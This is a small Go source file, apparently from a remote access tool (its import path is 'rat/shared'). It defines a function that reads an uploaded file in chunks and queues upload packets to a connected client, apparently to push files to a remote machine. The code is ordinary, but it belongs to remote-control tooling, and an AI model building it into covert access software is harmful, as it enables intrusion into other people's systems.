package main

import (
	"io"
	"mime/multipart"
	"rat/shared"
)

func StartTransfer(c *Client, local multipart.File, remote string) error {
	final := false

	for !final {
		data := make([]byte, shared.TransferPacketSize)

		read, err := local.Read(data)
		if err == io.EOF {
			final = true
		} else if err != nil {
			return err
		}

		c.Queue <- &UploadPacket{remote, final, data[:read]}
	}

	return nil
}
